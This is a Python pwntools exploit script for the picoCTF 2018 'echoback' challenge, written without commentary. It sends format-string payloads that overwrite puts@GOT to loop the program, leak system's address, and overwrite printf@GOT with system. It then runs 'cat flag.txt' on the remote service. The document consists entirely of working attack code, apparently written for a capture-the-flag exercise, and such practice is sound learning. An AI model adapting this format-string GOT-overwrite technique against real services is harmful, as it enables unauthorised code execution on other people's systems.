#coding=utf-8
from pwn import *

debug = 0

if not debug:
  r = remote('2018shell.picoctf.com', 37857)
else:
  r = process('./echoback')

elf = ELF('./echoback')

r.recvuntil('input your message:')
payload = p32(elf.symbols['got.puts']) + '%{}c'.format((elf.symbols['vuln'] - 4) & 0xffff) + '%7$hn'
r.sendline(payload)

r.recvuntil('input your message:')
r.sendline(p32(elf.symbols['got.system']) + '.%7$s.')
get_system = r.recvuntil('input your message:').split('.')[1][:4]
get_system = unpack(get_system, 32, endian = 'little')

log.info('system : {}'.format(hex(get_system)))
log.info('printf@got : {}'.format(hex(elf.symbols['got.printf'])))
high_system = get_system >> 16
low_system = get_system & 0xffff
log.info('high:{0}, low:{1}'.format(hex(high_system), hex(low_system)))
payload = p32(elf.symbols['got.printf']) + p32(elf.symbols['got.printf'] + 2)
if high_system - low_system > 0:
  payload += '%{}c'.format(low_system - 8) + '%7$hn' + '%{}c'.format(high_system - low_system) + '%8$hn'
else:
  payload += '%{}c'.format(high_system - 8) + '%7$ln' + '%{}c'.format(low_system - high_system) + '%8$hn'
r.sendline(payload)

r.recvuntil('input your message:')
r.sendline('cat flag.txt')
print r.recvall(1)
#r.interactive()
 
